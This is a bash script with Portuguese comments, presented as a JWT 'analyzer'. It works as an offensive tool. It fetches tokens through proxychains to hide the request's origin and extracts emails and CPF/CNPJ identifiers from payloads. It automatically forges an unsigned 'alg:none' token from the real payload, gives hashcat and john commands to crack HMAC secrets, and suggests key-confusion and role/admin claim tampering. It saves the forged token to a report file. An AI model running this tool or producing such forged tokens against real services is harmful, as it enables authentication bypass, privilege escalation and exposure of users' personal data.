#!/bin/bash
# JWT Analyzer - Análise inteligente de JWT tokens
echo "=== JWT ANALYZER ==="

if [ -z "$1" ]; then
    echo "Uso: $0 <JWT_TOKEN_OU_URL>"
    echo "Exemplo: $0 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
    echo "Exemplo: $0 https://api.example.com/token"
    exit 1
fi

INPUT="$1"

# Função para decodificar base64 URL-safe
decode_base64url() {
    local input="$1"
    # Adicionar padding se necessário
    case $((${#input} % 4)) in
        2) input="${input}==" ;;
        3) input="${input}=" ;;
    esac
    # Converter base64url para base64 padrão
    input=$(echo "$input" | tr '_-' '/+')
    echo "$input" | base64 -d 2>/dev/null
}

# Verificar se é URL ou token direto
if [[ "$INPUT" =~ ^https?:// ]]; then
    echo "Obtendo JWT de: $INPUT"
    JWT=$(proxychains4 -q curl -s "$INPUT" | grep -oP 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' | head -1)
    if [ -z "$JWT" ]; then
        echo "Nenhum JWT encontrado na URL"
        exit 1
    fi
else
    JWT="$INPUT"
fi

echo "Analisando JWT: ${JWT:0:50}..."

# Validar formato JWT
if [[ ! "$JWT" =~ ^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+ ]]; then
    echo "Erro: Formato JWT inválido"
    exit 1
fi

# Separar partes do JWT
IFS='.' read -r HEADER PAYLOAD SIGNATURE <<< "$JWT"

echo -e "\n[1] HEADER DECODIFICADO:"
HEADER_JSON=$(decode_base64url "$HEADER")
echo "$HEADER_JSON" | jq . 2>/dev/null || echo "$HEADER_JSON"

echo -e "\n[2] PAYLOAD DECODIFICADO:"
PAYLOAD_JSON=$(decode_base64url "$PAYLOAD")
echo "$PAYLOAD_JSON" | jq . 2>/dev/null || echo "$PAYLOAD_JSON"

echo -e "\n[3] ANÁLISE DE SEGURANÇA:"

# Verificar algoritmo
ALG=$(echo "$HEADER_JSON" | jq -r '.alg' 2>/dev/null)
echo "Algoritmo: $ALG"

case "$ALG" in
    "none")
        echo "⚠️  CRÍTICO: Algoritmo 'none' - Token sem assinatura!"
        echo "💡 EXPLOIT: Altere alg para 'none' e remova signature"
        ;;
    "HS256"|"HS384"|"HS512")
        echo "⚠️  ATENÇÃO: HMAC - Vulnerável a ataques de força bruta"
        echo "💡 EXPLOIT: Tente força bruta na chave secreta"
        ;;
    "RS256"|"RS384"|"RS512")
        echo "✅ RSA - Mais seguro, mas verifique key confusion"
        echo "💡 EXPLOIT: Tente alterar RS256 para HS256"
        ;;
esac

# Verificar expiração
EXP=$(echo "$PAYLOAD_JSON" | jq -r '.exp' 2>/dev/null)
if [ "$EXP" != "null" ] && [ -n "$EXP" ]; then
    CURRENT_TIME=$(date +%s)
    if [ "$EXP" -lt "$CURRENT_TIME" ]; then
        echo "⚠️  Token EXPIRADO (exp: $EXP)"
    else
        EXP_DATE=$(date -d "@$EXP" 2>/dev/null || echo "Data inválida")
        echo "✅ Token válido até: $EXP_DATE"
    fi
else
    echo "⚠️  Token SEM EXPIRAÇÃO - Risco de segurança"
fi

# Verificar claims importantes
echo -e "\n[4] CLAIMS IMPORTANTES:"
echo "$PAYLOAD_JSON" | jq -r 'to_entries[] | select(.key | test("sub|user|email|role|admin|scope|aud|iss")) | "\(.key): \(.value)"' 2>/dev/null

# Verificar dados sensíveis
echo -e "\n[5] DADOS SENSÍVEIS ENCONTRADOS:"
SENSITIVE_DATA=$(echo "$PAYLOAD_JSON" | grep -oiE '([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[0-9]{3}\.[0-9]{3}\.[0-9]{3}-[0-9]{2}|[0-9]{2}\.[0-9]{3}\.[0-9]{3}/[0-9]{4}-[0-9]{2}|admin|root|password|secret|key)')

if [ -n "$SENSITIVE_DATA" ]; then
    echo "$SENSITIVE_DATA" | sort -u
else
    echo "Nenhum dado sensível óbvio encontrado"
fi

# Sugestões de exploit
echo -e "\n[6] SUGESTÕES DE EXPLOIT:"

# None algorithm attack
echo "1. None Algorithm Attack:"
echo "   Header: {\"alg\":\"none\",\"typ\":\"JWT\"}"
echo "   Token: $(echo '{"alg":"none","typ":"JWT"}' | base64 -w 0 | tr '+/' '-_' | tr -d '=').$(echo "$PAYLOAD_JSON" | base64 -w 0 | tr '+/' '-_' | tr -d '=')."

# Key confusion attack
if [ "$ALG" = "RS256" ]; then
    echo "2. Key Confusion Attack (RS256 → HS256):"
    echo "   Altere 'alg' para 'HS256' e use a chave pública como HMAC secret"
fi

# Weak secret brute force
if [[ "$ALG" =~ ^HS ]]; then
    echo "3. Brute Force Secret:"
    echo "   Use: hashcat -m 16500 jwt.txt wordlist.txt"
    echo "   Ou: john --format=HMAC-SHA256 jwt.txt"
fi

# Claims manipulation
echo "4. Claims Manipulation:"
echo "   Tente alterar: role, admin, user_id, permissions"
echo "   Exemplo: {\"role\":\"admin\",\"admin\":true}"

# Salvar análise
ANALYSIS_FILE="/tmp/jwt_analysis_$(date +%s).txt"
echo -e "\n[7] Salvando análise em: $ANALYSIS_FILE"

cat > "$ANALYSIS_FILE" <<EOF
JWT ANALYSIS REPORT
==================
Token: $JWT

HEADER:
$HEADER_JSON

PAYLOAD:
$PAYLOAD_JSON

ALGORITHM: $ALG
EXPIRATION: $EXP_DATE

EXPLOITS:
1. None Algorithm: $(echo '{"alg":"none","typ":"JWT"}' | base64 -w 0 | tr '+/' '-_' | tr -d '=').$(echo "$PAYLOAD_JSON" | base64 -w 0 | tr '+/' '-_' | tr -d '=').
2. Modified Claims: Altere role/admin/permissions
3. Brute Force: Use hashcat/john se HMAC
EOF

echo "Análise JWT concluída!"